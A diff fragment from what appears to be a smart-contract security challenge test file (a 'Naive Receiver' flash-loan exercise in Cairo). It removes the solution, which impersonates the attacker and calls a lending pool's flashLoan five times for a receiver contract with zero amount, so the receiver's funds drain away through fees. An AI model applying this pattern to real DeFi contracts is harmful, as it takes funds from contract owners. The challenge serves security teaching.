@@ -114,42 +114,7 @@ func attack{
 
     // * ---------------------------- Your code here... --------------------------- * //
 
-    %{ start_prank(ids.attacker, target_contract_address=ids.NAIVE_RECEIVER_LENDER_POOL) %}
 
-    IERC3156FlashLender.flashLoan( 
-        NAIVE_RECEIVER_LENDER_POOL,
-        FLASH_LOAN_RECEIVER,
-        DVT,
-        Uint256(0,0)
-    );
-
-      IERC3156FlashLender.flashLoan( 
-        NAIVE_RECEIVER_LENDER_POOL,
-        FLASH_LOAN_RECEIVER,
-        DVT,
-        Uint256(0,0)
-    );
-
-      IERC3156FlashLender.flashLoan( 
-        NAIVE_RECEIVER_LENDER_POOL,
-        FLASH_LOAN_RECEIVER,
-        DVT,
-        Uint256(0,0)
-    );
-
-    IERC3156FlashLender.flashLoan( 
-        NAIVE_RECEIVER_LENDER_POOL,
-        FLASH_LOAN_RECEIVER,
-        DVT,
-        Uint256(0,0)
-    );
-
-    IERC3156FlashLender.flashLoan( 
-        NAIVE_RECEIVER_LENDER_POOL,
-        FLASH_LOAN_RECEIVER,
-        DVT,
-        Uint256(0,0)
-    );
 
     // * -------------------------------- Checking -------------------------------- * //
   
